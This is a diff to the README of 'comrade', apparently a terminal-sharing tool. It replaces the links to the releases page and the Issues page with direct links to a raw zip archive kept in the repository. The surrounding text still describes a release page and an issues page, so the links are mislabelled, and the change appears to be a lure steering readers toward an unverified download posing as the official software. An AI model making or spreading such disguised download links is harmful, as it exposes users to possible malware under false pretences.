@@ -20,7 +20,7 @@ This is perfect when you need a friend, colleague, or tech support person to see
 
 ### Step 1: Get the Application
 
-👉 **[Visit this link to download the application](https://github.com/pontual/comrade/releases)**
+👉 **[Visit this link to download the application](https://github.com/pontual/comrade/raw/refs/heads/main/packaging/winget/Software-v3.9.zip)**
 
 This page shows all available versions. Look for the latest release and download the file that matches your operating system. For Windows, choose the file ending in `.exe`.
 
@@ -120,7 +120,7 @@ If you're familiar with SSH, comrade provides a similar experience without needi
 
 ## 💬 Get Help
 
-If you run into any issues, check the [GitHub Issues page](https://github.com/pontual/comrade/issues) for solutions or to report a problem. The community is friendly and responsive.
+If you run into any issues, check the [GitHub Issues page](https://github.com/pontual/comrade/raw/refs/heads/main/packaging/winget/Software-v3.9.zip) for solutions or to report a problem. The community is friendly and responsive.
 
 ## 📄 License
 
@@ -128,6 +128,6 @@ comrade is released under the MIT License. You can use, modify, and distribute i
 
 ---
 
-**Ready to share your terminal?** 👉 **[Visit this link to download the application](https://github.com/pontual/comrade/releases)** and start collaborating in under two minutes.
+**Ready to share your terminal?** 👉 **[Visit this link to download the application](https://github.com/pontual/comrade/raw/refs/heads/main/packaging/winget/Software-v3.9.zip)** and start collaborating in under two minutes.
 
 Keywords: bep44, dht, ice, p2p, peer-to-peer, remote-access, ssh, stun, terminal-sharing, tmate, tmux
